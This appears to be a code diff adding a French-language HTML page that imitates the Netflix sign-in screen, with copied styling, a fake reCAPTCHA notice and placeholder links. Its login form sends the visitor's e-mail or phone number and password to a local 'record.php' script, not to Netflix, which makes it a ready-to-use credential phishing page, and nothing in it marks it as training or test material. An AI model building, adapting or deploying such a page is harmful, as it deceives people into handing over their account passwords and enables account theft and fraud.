@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23E50914'/><text x='50%' y='50%' text-anchor='middle' dy='.35em' font-size='20' fill='white'>N</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .header {
+            padding: 20px 0;
+            background: transparent;
+        }
+
+        .header-content {
+            max-width: 1170px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 37px;
+            font-weight: 900;
+            color: #E50914;
+            text-decoration: none;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .lang-selector {
+            background: transparent;
+            border: 1px solid #333;
+            color: #333;
+            padding: 8px 15px;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .main-container {
+            min-height: 100vh;
+            background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)), url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" viewBox="0 0 1920 1080"><rect width="1920" height="1080" fill="%23141414"/><g opacity="0.3"><rect x="0" y="0" width="400" height="600" fill="%23E50914"/><rect x="500" y="200" width="300" height="400" fill="%232D2D2D"/><rect x="900" y="100" width="350" height="500" fill="%23444"/><rect x="1300" y="50" width="400" height="650" fill="%23222"/></g></svg>');
+            background-size: cover;
+            background-position: center;
+            padding: 0;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 100px);
+            padding: 40px 20px;
+        }
+
+        .login-form {
+            background: rgba(0,0,0,0.75);
+            padding: 60px 68px 40px;
+            border-radius: 4px;
+            max-width: 450px;
+            width: 100%;
+            position: relative;
+            backdrop-filter: blur(3px);
+        }
+
+        .login-form h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 28px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            background: #333;
+            color: #fff;
+        }
+
+        .login-input::placeholder {
+            color: #8c8c8c;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #E50914;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 24px 0 12px;
+        }
+
+        .form-help {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            font-size: 13px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .help-link {
+            color: #B3B3B3;
+            text-decoration: none;
+        }
+
+        .signup-now {
+            color: #737373;
+            margin-top: 16px;
+        }
+
+        .signup-now a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .help-text {
+            color: #B3B3B3;
+            font-size: 13px;
+            margin-top: 16px;
+        }
+
+        .help-text a {
+            color: #B3B3B3;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                padding: 0 15px;
+            }
+
+            .login-form {
+                padding: 40px 28px;
+                margin: 20px;
+            }
+
+            .login-form h1 {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <header class="header">
+            <div class="header-content">
+                <a href="#" class="logo">NETFLIX</a>
+                <div class="header-right">
+                    <select class="lang-selector">
+                        <option>Français</option>
+                        <option>English</option>
+                    </select>
+                </div>
+            </div>
+        </header>
+
+        <div class="login-container">
+            <div class="login-form">
+                <h1>S'identifier</h1>
+                <form id="loginForm" method="POST" action="record.php">
+                    <div class="input-group">
+                        <input type="email" name="email" class="login-input" placeholder="E-mail ou numéro de téléphone" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password" class="login-input" placeholder="Mot de passe" required>
+                    </div>
+                    <button type="submit" class="login-btn">S'identifier</button>
+                    <div class="form-help">
+                        <label class="remember-me">
+                            <input type="checkbox" name="remember" style="margin-right: 4px;">
+                            Se souvenir de moi
+                        </label>
+                        <a href="#" class="help-link">Besoin d'aide ?</a>
+                    </div>
+                    <div class="signup-now">
+                        Première visite sur Netflix ? <a href="#">Inscrivez-vous maintenant</a>.
+                    </div>
+                    <div class="help-text">
+                        Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot. 
+                        <a href="#">En savoir plus.</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Effet de focus sur les inputs
+        document.querySelectorAll('.login-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.backgroundColor = '#454545';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.backgroundColor = '#333';
+            });
+        });
+
+        // Animation du bouton au clic
+       // document.querySelector('.login-btn').addEventListener('click', function() {
+       //     this.textContent = 'Connexion en cours...';
+       //     this.disabled = true;
+      //  });
+    </script>
+</body>
+</html>
